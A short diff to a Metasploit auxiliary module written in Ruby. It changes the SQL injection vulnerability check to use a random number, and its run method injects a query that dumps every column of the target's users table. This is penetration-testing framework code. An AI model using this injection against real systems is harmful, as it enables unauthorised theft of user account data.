@@ -52,9 +52,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    body = send_sql_request('0xABCDABCD+0xABCDABCD')
+    mynum = "#{Rex::Text.rand_text_numeric(8..20)}"
+    body = send_sql_request(mynum)
     return Exploit::CheckCode::Unknown if body.nil?
-    return Exploit::CheckCode::Vulnerable if body.include?('5764765594')
+    return Exploit::CheckCode::Vulnerable if body.include?(mynum)
 
     Exploit::CheckCode::Unknown
   end
@@ -62,7 +63,6 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status("#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...")
 
-    # Commas can't be used in the injection, so fetch all the columns
     body = send_sql_request("* from #{datastore['DB_PREFIX']}users")
     fail_with(Failure::UnexpectedReply, 'No response or unexpected status code in response') if body.nil?
 
